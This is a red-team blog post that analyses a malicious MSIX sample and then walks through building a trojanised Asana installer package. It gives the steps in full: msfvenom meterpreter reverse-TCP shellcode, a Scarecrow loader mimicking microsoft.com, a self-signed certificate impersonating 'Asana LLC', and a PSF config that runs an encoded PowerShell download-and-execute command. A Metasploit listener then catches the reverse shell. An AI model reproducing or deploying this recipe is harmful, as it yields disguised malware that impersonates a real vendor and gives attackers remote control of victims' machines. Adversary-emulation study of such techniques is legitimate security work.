---
title: "Creating malicious .MSIX files for initial access"
author: "Trevor Saudi"
date: 2024-06-11
description: ""
draft: false
subtitle: ""
tags:
- Red Teaming
- Malware Development
- MSIX 
- SSL
- Initial Access
---

<style>



@import url('https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css');

@import url('https://fonts.googleapis.com/css?family=Open+Sans');


   
  *, ::before, ::after {
    border-style: none;
    font: 16px;

  }

  body {
  margin: 20px;
  font: 16px 'Open Sans', sans-serif;
}

.center { 
       display:inline-block; 
       margin-left: 60px; 
       margin-top: -20px;
}

</style>

![image](/posts/2024-06-11_red_team06/images/logo.png)



## Introduction

- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
<br>
- In this article, we will go over the `.msix` file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.

## The MSIX File Format

- Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the `EXE, MSI, APPX` and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging. 
- Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.
- The general MSIX file format can be deconstructed as shown:

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/msix.png"> 
</div>

### 1. Package Payload

- `Application Files`: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.

### 2. Footprint Files

- `AppxManifest.xml`: This file contains metadata about the app package such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.
- `AppxBlockMap.xml`: To ensure file integrity, this file will contain the checksums of all the files in the package
- `AppxSignature.p7x`: The digital signature verifying the publisher's identity and ensures that a package has not been tampered with
- `CodeIntegrity.cat`: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package


## Package Support Framework

- The `Package Support Framework (PSF)`, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.

- It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/psf.png"> 
</div>

- In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let's discuss the various components.

  - `Config.JSON`: Contains settings and parameters for the PSF.
  - `PsfLauncher.exe`: The initial launcher that initiates the framework.
  - `Runtime Manager dll`: Dll responsible for managing runtime operations within the framework
  - `Runtime fix dll`: Dll that provides runtime fixes and patches required by the application

### StartingScriptWrapper.ps1

- `PSF` can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run. 
- To perform this, a configuration item called the `StartingScriptWrapper` can be defined to tell PSF to run a script after the packaged application finishes installing.
- We can use this to run scripts to stage our implants for Initial Access

## Analysis of a malicious sample

- Let us look at a malicious <a target="_blank" href="https://bazaar.abuse.ch/sample/bdd89826ab8d3e3c03833b1ea8e4b0a34c80f13bfa5882e5b82f896cec41d141">
sample </a> from malwarebazaar.
- Once you've downloaded and unzipped the sample, you will be presented with the following folder structure

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/unzippedmsix.png"> 
</div>

- In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.

- 4 files are of interest to us:

  1. AppxManifest
  2. Config.json
  3. StartingScriptWrapper
  4. usJzY 

### AppxManifest

- I highlighted 2 important sections here. The properties and the applications section.

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/appxmanifest.png"> 
</div>

- The `properties` section contains details identifying the application such as the name, description and the logo that the app uses.
- In the `applications` section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
- The `Capabilities section` is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the `runFullTrust` capability.

### Config.json

- This is where things start to get interesting. We can see the various parameters being used in the configuration

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/configfile.png"> 
</div>


1. The PSF executable will be launched.
2. `scriptExecutionMode` has been set to `RemoteSigned`, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
3. The `start script` section defines `usJzY.ps1` as the script that will be executed at the start.
4. `showWindow`  has been set to `false`, meaning the powershell script will run in the background without invoking the command window.


### StartingScriptWrapper

- The `StartingScriptWrapper` is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/startingsciptwrapper.png"> 
</div>


### usJzY

- Finally, we have the target script that is being executed by PSF.

<br>

<script src="https://gist.github.com/trevorsaudi/6d89accab3b06d02048fdd33d6d22bc1.js"></script>

- In summary, this is what the script is performing:

  1. Starts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11)
  2. Pulls a suspicious script from a remote URL and executes it. (line 20-80)
  3. Finally opens https://asana.com in the browser then waits for the background job to finish executing before exiting.

- This is what will contain the main logic for the implant being staged.

## Building a malicious msix for Initial Access

- Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that installs an application before executing our target malware.

### 1. Setting up the MSIX packaging tool and our setup file

- First, you will need to install the `MSIX packaging tool` from the Microsoft Store

<div class="center">
<img src="/posts/2024-06-11_red_team06/images/msixpackagingtool.png"> 
</div>

- You will also need the target application being packaged. I used Asana for this example.

### 2. The implant being staged

- We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources.
- We create our shellcode with msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 -f raw > protection.bin
```

- Then generate the loader using Scarecrow

```bash
./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 

```
<img src="/posts/2024-06-11_red_team06/images/scarecroww.png"> 

- Host the final loader



<img src="/posts/2024-06-11_red_team06/images/server.png"> 



### 3. Create an SSL certificate

- When running the MSIX file, Windows will check for the `digital signature` of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own `self-signed certificate`, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.

1. Create a new self-signed certificate

```powershell
New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Asana LLC" -FriendlyName "Asana LLC"

```

Subject must much the MSIX's Publisher attribute value.
- You can find the thumbprint of the certificate like this

```powershell
Set-Location Cert:\CurrentUser\My
Get-ChildItem | Format-Table Subject, FriendlyName, Thumbprint

```

2. Export the private key which we will use to sign the MSIX

```powershell
$password = ConvertTo-SecureString -Force -AsPlainText -String pass123
Export-PfxCertificate -Password $password -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath  C:\Users\Saudi\cert.pfx
```
3. Export the public key which we will install in the victim's computer

```powershell
Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath 'C:\Users\Saudi\cert.cer'
```

<img src="/posts/2024-06-11_red_team06/images/certificate.png"> 

- Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:

<img src="/posts/2024-06-11_red_team06/images/installcert.png"> 


<img src="/posts/2024-06-11_red_team06/images/localmachine.png">



- Install the cert in the Trusted Root Certification Authorities

<img src="/posts/2024-06-11_red_team06/images/rootcert.png"> 



### 4. Bundle the package and stage our loader

- Select the task and follow through the prompts

<img src="/posts/2024-06-11_red_team06/images/msixpackage1.png"> 

- Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.

<img src="/posts/2024-06-11_red_team06/images/asanainstaller.png"> 


- You can skip the Accelerator section. The package will automatically install in the system as shown


<img src="/posts/2024-06-11_red_team06/images/installation.png">

- Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable

<img src="/posts/2024-06-11_red_team06/images/entrypoint.png">

- Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.


<img src="/posts/2024-06-11_red_team06/images/packageeditor.png">


- In the package editor, click on package files, right-click on the "Package" and add the following appropriate files


<img src="/posts/2024-06-11_red_team06/images/rightclick.png" width=1000px;>

<img src="/posts/2024-06-11_red_team06/images/filestocopy.png" width=1000px;>

- You can edit files directly in the package editor by right-clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors. 

```javascript
{
  "applications": [
    {
      "id": "ASANA",
      "executable": "asana.exe",
      "scriptExecutionMode": "-ExecutionPolicy Unrestricted",
      "startScript": {
        "waitForScriptToFinish": true,
        "runOnce": false,
	      "timeOut": 30000,
        "showWindow": true,
        "scriptPath": "Hotfix.ps1"
      }
    }
  ]
}

```
- Create the `hotfix.ps1` file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it

<img src="/posts/2024-06-11_red_team06/images/cyberchef.png" width=1000px;>

```powershell
powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
```

- Add the `hotfix.ps1` staging script

<img src="/posts/2024-06-11_red_team06/images/hotfix.png" width=1000px;>

- Back to the manifest file, let's change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install

<img src="/posts/2024-06-11_red_team06/images/manifest.png">

- In this section, take note of the Application ID defined. We will also modify the executable value

<img src="/posts/2024-06-11_red_team06/images/entrypoint1.png">

- Change it to point to the psf executable:

<img src="/posts/2024-06-11_red_team06/images/psflauncher.png">

- Save and exit. Finally create your MSIX file.

## Testing our malicious sample

{{< alert >}}
Ensure that the Asana application is not installed in the system
{{< /alert >}}


<img src="/posts/2024-06-11_red_team06/images/asanainstaller2.png">


- Setup our listener

```bash
msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
```

<img src="/posts/2024-06-11_red_team06/images/listener.png">

- Run the MSIX installation and catch your shell

<img src="/posts/2024-06-11_red_team06/images/session1.png">

- Happy hacking!